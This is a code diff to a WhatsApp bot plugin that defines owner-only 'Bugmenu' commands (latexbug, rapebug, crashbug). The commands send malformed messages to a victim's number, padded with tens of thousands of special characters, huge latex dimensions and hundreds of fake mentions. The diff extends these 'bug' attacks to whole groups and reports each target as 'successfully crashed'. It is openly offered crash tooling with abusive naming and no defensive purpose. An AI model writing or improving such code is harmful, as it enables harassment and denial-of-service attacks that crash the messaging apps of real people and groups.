@@ -29,7 +29,7 @@ async function latexBug(client, jid) {
                             latexMetadata: {
                                 text: 'ꦾ'.repeat(35000),
                                 expressions: Array.from({ length: 80 }, (_, i) => ({
-                                    latexExpression: `(${Math.PI + i})`, // Explicit string conversion
+                                    latexExpression: `(${Math.PI + i})`,
                                     width: 0xFFFFFFF,
                                     height: 0xFFFFFFF
                                 }))
@@ -69,7 +69,7 @@ async function rapeBug(client, target) {
                     }))
                 })),
                 contextInfo: {
-                    mentionedJid: Array.from({ length: 300 }, () => 
+                    mentionedJid: Array.from({ length: 300 }, () =>
                         `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
                     ),
                     forwardingScore: 999999999,
@@ -136,14 +136,32 @@ async function crashBug(client, target) {
 }
 
 //========================================================================================================================
-// COMMANDS
+// COMMAND HANDLER
 //========================================================================================================================
+
+function normalizeTarget(input) {
+    if (!input) return null;
+
+    const trimmed = input.trim();
+
+    // Check if it's a raw number (9-15 digits)
+    if (/^\d{9,15}$/.test(trimmed)) {
+        return `${trimmed}@s.whatsapp.net`;
+    }
+
+    // Check if it's a raw group ID (e.g., 1234567890-1234567890@g.us or 124@g.us)
+    if (trimmed.endsWith('@g.us') || trimmed.includes('-') && trimmed.endsWith('@g.us')) {
+        return trimmed;
+    }
+
+    return null;
+}
 
 keith({
     pattern: "latexbug",
     aliases: ["buglatex", "latexbg"],
     category: "Bugmenu",
-    description: "Send bugs to victim",
+    description: "Send bugs to victim or group (raw number or group ID)",
     filename: __filename
 }, async (from, client, conText) => {
     const { reply, q, isSuperUser } = conText;
@@ -152,17 +170,19 @@ keith({
         return reply("Owner only!");
     }
 
-    const number = q?.trim().replace(/\D/g, "");
-
-    if (!number) {
-        return reply("provide number");
+    if (!q) {
+        return reply("Usage: .latexbug <number> or .latexbug <groupID@g.us>\nExample: .latexbug 254748387615 or .latexbug 1234567890-1234567890@g.us");
     }
 
-    const target = number + "@s.whatsapp.net";
+    const target = normalizeTarget(q);
+
+    if (!target) {
+        return reply("Invalid input. Use a raw number (e.g., 254748387615) or raw group ID (e.g., 1234567890-1234567890@g.us)");
+    }
 
     try {
         await latexBug(client, target);
-        return reply(`Target fucked successfully 💀`);
+        return reply(`💀 Target (${target}) successfully crashed.`);
     } catch (err) {
         console.error("latexbug error:", err);
         return reply(`❌ Error: ${err.message}`);
@@ -173,7 +193,7 @@ keith({
     pattern: "rapebug",
     aliases: ["bugrape", "rapebg", "rape"],
     category: "Bugmenu",
-    description: "Send bugs to victim",
+    description: "Send bugs to victim or group (raw number or group ID)",
     filename: __filename
 }, async (from, client, conText) => {
     const { reply, q, isSuperUser } = conText;
@@ -182,17 +202,19 @@ keith({
         return reply("Owner only!");
     }
 
-    const number = q?.trim().replace(/\D/g, "");
-
-    if (!number) {
-        return reply("provide number");
+    if (!q) {
+        return reply("Usage: .rapebug <number> or .rapebug <groupID@g.us>\nExample: .rapebug 254748387615 or .rapebug 1234567890-1234567890@g.us");
     }
 
-    const target = number + "@s.whatsapp.net";
+    const target = normalizeTarget(q);
+
+    if (!target) {
+        return reply("Invalid input. Use a raw number (e.g., 254748387615) or raw group ID (e.g., 1234567890-1234567890@g.us)");
+    }
 
     try {
         await rapeBug(client, target);
-        return reply(`Target fucked successfully 💀`);
+        return reply(`💀 Target (${target}) successfully crashed.`);
     } catch (err) {
         console.error("rapebug error:", err);
         return reply(`❌ Error: ${err.message}`);
@@ -203,7 +225,7 @@ keith({
     pattern: "crashbug",
     aliases: ["bugcrash", "crashbg", "crash"],
     category: "Bugmenu",
-    description: "Send bugs to victim",
+    description: "Send bugs to victim or group (raw number or group ID)",
     filename: __filename
 }, async (from, client, conText) => {
     const { reply, q, isSuperUser } = conText;
@@ -212,17 +234,19 @@ keith({
         return reply("Owner only!");
     }
 
-    const number = q?.trim().replace(/\D/g, "");
-
-    if (!number) {
-        return reply("provide number");
+    if (!q) {
+        return reply("Usage: .crashbug <number> or .crashbug <groupID@g.us>\nExample: .crashbug 254748387615 or .crashbug 1234567890-1234567890@g.us");
     }
 
-    const target = number + "@s.whatsapp.net";
+    const target = normalizeTarget(q);
+
+    if (!target) {
+        return reply("Invalid input. Use a raw number (e.g., 254748387615) or raw group ID (e.g., 1234567890-1234567890@g.us)");
+    }
 
     try {
         await crashBug(client, target);
-        return reply(`Target fucked successfully 💀`);
+        return reply(`💀 Target (${target}) successfully crashed.`);
     } catch (err) {
         console.error("crashbug error:", err);
         return reply(`❌ Error: ${err.message}`);
